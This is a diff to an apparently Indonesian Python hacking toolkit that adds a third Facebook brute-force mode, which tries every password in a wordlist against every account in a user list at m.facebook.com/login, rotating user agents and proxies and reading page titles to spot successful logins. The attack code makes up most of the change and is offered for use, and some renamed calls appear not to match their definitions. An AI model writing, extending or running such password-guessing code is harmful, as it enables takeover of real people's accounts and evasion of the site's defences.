@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Gausah pake acara Recode Recode segala ya Kontol
 import math , requests , os , time , datetime , re , json , string , random , hashlib , sys , threading
 from urllib.request import Request, urlopen
 from bs4 import BeautifulSoup
@@ -22,7 +21,7 @@ def banner():
     print (O+' / `.`. ,-\'         `-/ /   ) '+W+'  ________| '+C+'hEllO, L4zy pe0ple!!'+W+' |')
     print (O+'(    `,\'             _ \   ;  '+W+' /        |______________________|')
     print (O+' \  _( _           ,\'  )/  : '+W+'_/                                 ')
-    print (O+'  \ `-( `-.      ,\'    /  /                            '+G+' v.5.7  ')
+    print (O+'  \ `-( `-.      ,\'    /  /                            '+G+' v.5.8  ')
     print (O+'   \   \ __`.___/_,-( /_,\' '+R+'_    ____ ___  _  _ ____ _  _ _ ____ ')
     print (O+'    `--\'`,\_o,(_)o_,\',     '+R+'|    |__|   /  |\/| |__| |\ | | |__| ')
     print (O+'        (    /`-\'\    )    '+R+'|___ |  |  /__ |  | |  | | \| | |  | ')
@@ -48,7 +47,7 @@ def bannerfb():
     print ('')
     print (B+'███████'+W+'▄▄███████████▄')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╔═╗┌─┐┌─┐┌─┐')
-    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╠╣ ├─┤│  ├┤ '+O+'    V.2.0')
+    print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╠╣ ├─┤│  ├┤ '+O+'    V.3.0')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'    ╚  ┴ ┴└─┘└─┘')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╔╗ ┬─┐┬ ┬┌┬┐┌─┐')
     print (B+'▓▓▓▓▓▓█'+W+'              █'+G+'        ╠╩╗├┬┘│ │ │ ├┤ ')
@@ -995,7 +994,7 @@ def lk21():
         print (C+' ['+W+' 404 '+C+']'+R+' >'+W+' Film tidak ditemukan')
     print ('')
 
-def sfbbrute():
+def singlefbbrute():
     URL = 'https://m.facebook.com/login'
     print ('')
     email = input(C+' Username '+R+'> '+W)
@@ -1025,8 +1024,9 @@ def sfbbrute():
                 print ('')
                 print(C+' ['+W+' Result '+C+']'+R+' > '+G+'Success')
                 print(C+' ['+W+' Password '+C+']'+R+' > '+W+password)
+                main()
 
-def mfbbrute():
+def multifbbrute():
     URL = 'https://m.facebook.com/login'
     print ('')
     username = input(C+' Userlist '+R+'> '+W)
@@ -1053,6 +1053,37 @@ def mfbbrute():
             if(str(a) == '<title>Facebook</title>'):
                 print(C+' ['+G+' OK '+C+']'+R+' > '+W+email,end='', flush=True)
 
+def multibrute():
+    URL = 'https://m.facebook.com/login'
+    print ('')
+    username = input(C+' Userlist '+R+'> '+W)
+    passwd = input(C+' Wordlist '+R+'> '+W)
+    print ('')
+    uname = open(username, 'r')
+    for email in uname:
+        print(C+' ['+O+' USER '+C+']'+R+' > '+W+email)
+        passw = open(passwd, 'r')
+        for password in passw:
+            form_data = {
+                'email' : email,
+                'pass' : password
+            }
+            user_agent = random.choice(ua)
+            headers = {'User-Agent': user_agent}
+            proxies_a = random.choice(prox)
+            proxies = {'http': proxies_a}
+            with requests.Session() as c:
+                c.get(URL, headers=headers, proxies=proxies)
+                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
+                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
+                soup = BeautifulSoup(b.content, 'html.parser')
+                a = soup.find('title')
+                if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
+                    print(C+' ['+R+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
+                if(str(a) == '<title>Facebook</title>'):
+                    print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
+        print ('')
+
 def hma() :
     total = int(input(C+' Total '+R+'> '+W))
     def rand(chars=string.ascii_uppercase + string.digits):
@@ -1062,7 +1093,7 @@ def hma() :
         print (' '+asd+'-'+asd+'-'+asd)
 
 
-def generate() :
+def custgen() :
     pil = str(input(C+' Input Base (y/n) ? '+R+'> '+W))
     if pil == 'n' or pil == 'N' :
         size = int(input(C+' Jumlah digit kode '+R+'> '+W))
@@ -1229,7 +1260,26 @@ def fbmenu():
     print ('')
     print (C+' 01'+R+'  :'+W+'  Brute Single Target with Wordlist')
     print (C+' 02'+R+'  :'+W+'  Brute Multiple Target with Single Password')
+    print (C+' 03'+R+'  :'+W+'  Brute Multiple Target with Wordlist')
     print ('')
+    print (C+' 00'+R+'  :'+W+'  Back')
+    print (C+' 99'+R+'  :'+W+'  Exit')
+    print ('')
+    cmd = str(input(W+' Menu/Brute/Facebook'+R+' > '+W))
+    if cmd == '01' or cmd == '1' :
+        singlefbbrute()
+    elif cmd == '02' or cmd == '2' :
+        multifbbrute()
+    elif cmd == '03' or cmd == '3' :
+        multibrute()
+    elif cmd == '00' or cmd == '0' :
+        banner()
+        brute()
+    elif cmd == '99' :
+        exit()
+    else :
+        fbbrute()
+
 
 def apk():
     bannerapk()
@@ -1414,7 +1464,7 @@ def menu():
         apk()
     elif cmd == '08' or cmd == '8' :
         banner()
-        generate()
+        gen()
     elif cmd == '99' :
         exit()
     else :
